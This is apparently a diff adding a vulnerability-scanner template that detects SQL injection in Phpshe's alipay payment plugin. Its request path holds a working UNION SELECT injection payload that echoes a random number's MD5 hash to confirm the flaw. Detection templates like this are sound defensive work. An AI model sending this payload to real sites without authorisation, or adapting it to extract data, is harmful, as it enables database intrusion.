@@ -1,0 +1,22 @@
+id: poc-yaml-phpshe-sqli
+info:
+  name: Phpshe SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    SQL injection vulnerability in Phpshe allowing attackers to inject malicious SQL commands.
+
+variables:
+  rand: '{{rand_int(10000, 21000)}}'
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/include/plugin/payment/alipay/pay.php?id=pay`%20where%201=1%20union%20select%201,2,CONCAT(md5({{rand}})),4,5,6,7,8,9,10,11,12%23_'
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '{{md5(rand)}}'
+        part: body
